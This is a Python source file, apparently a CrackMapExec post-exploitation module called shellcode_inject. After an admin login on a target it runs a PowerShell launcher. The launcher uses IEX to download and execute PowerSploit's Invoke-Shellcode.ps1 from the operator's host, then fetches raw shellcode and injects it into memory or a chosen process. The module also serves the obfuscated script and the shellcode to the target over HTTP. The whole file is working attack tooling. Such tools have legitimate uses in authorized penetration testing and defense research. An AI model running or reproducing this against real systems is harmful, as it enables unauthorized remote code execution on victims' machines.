from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script
from sys import exit
import os

class CMEModule:
    '''
        Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
        Module by @byt3bl33d3r
    '''
    name = 'shellcode_inject'

    description = "Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script"

    chain_support = False

    def options(self, context, module_options):
        '''
            PATH     Path to the raw shellcode to inject
            PROCID   Process ID to inject into (default: current powershell process)
        '''

        if not 'PATH' in module_options:
            context.log.error('PATH option is required!')
            exit(1)

        self.shellcode_path = os.path.expanduser(module_options['PATH'])
        if not os.path.exists(self.shellcode_path):
            context.log.error('Invalid path to shellcode!')
            exit(1)

        self.procid  = None

        if 'PROCID' in module_options.keys():
            self.procid = module_options['PROCID']

    def launcher(self, context, command):
        launcher = """
        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-Shellcode.ps1');
        $WebClient = New-Object System.Net.WebClient;
        [Byte[]]$bytes = $WebClient.DownloadData('{server}://{addr}:{port}/{shellcode}');
        Invoke-Shellcode -Force -Shellcode $bytes""".format(server=context.server,
                                                              port=context.server_port,
                                                              addr=context.localip,
                                                              shellcode=os.path.basename(self.shellcode_path))

        if self.procid:
            launcher += ' -ProcessID {}'.format(self.procid)

        return create_ps_command(launcher, force_ps32=True)

    def payload(self, context, command):
        with open(get_ps_script('Powersploit/CodeExecution/Invoke-Shellcode.ps1') ,'r') as ps_script:
            return obfs_ps_script(ps_script.read())

    def on_admin_login(self, context, connection, launcher, payload):
        connection.execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request, launcher, payload):
        if 'Invoke-Shellcode.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(payload)

        elif os.path.basename(self.shellcode_path) == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open(self.shellcode_path, 'rb') as shellcode:
                request.wfile.write(shellcode.read())

            #Target has the shellcode, stop tracking the host
            request.stop_tracking_host()

        else:
            request.send_response(404)
            request.end_headers()